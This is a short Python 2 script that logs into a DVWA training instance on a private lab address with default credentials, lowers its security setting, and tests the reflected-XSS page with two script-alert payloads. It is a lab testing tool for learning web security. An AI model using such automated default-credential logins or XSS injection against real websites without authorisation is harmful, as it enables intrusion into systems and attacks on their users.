#!/usr/bin/env python


import mechanize
import re
import sys

br = mechanize.Browser()
response1 = br.open('http://192.168.30.143/dvwa/login.php')
br.select_form(nr=0)
br.set_value("admin", name="username", nr=0)
br.set_value("password", name="password", nr=0)
br.submit()
print "DVWA Login successful"

response2=br.open('http://192.168.30.143/dvwa/security.php')
br.select_form(nr=0)
br.set_value(['low'], name='security', nr=0)
br.submit()
print "DVWA Security level set to low"


print "DVWA XSS Checking...."
response3=br.open('http://192.168.30.143/dvwa/vulnerabilities/xss_r/')

xsspayloadlist= ['<ScRipT>alert("ABC");</ScRipT>', '<script>alert(123)</script>']

for xss in xsspayloadlist:
        br.select_form(nr=0)
        br.set_value(xss, name="name", nr=0)
        br.submit()
        #print br.response().read()
        response= br.response().read()
        if xss in response:
                print "[+] Vulnerable: XSS vulnerbility detect on the tested page.XSS payload test " , xss
        else:
                print "No, XSS vulnerability not detect"
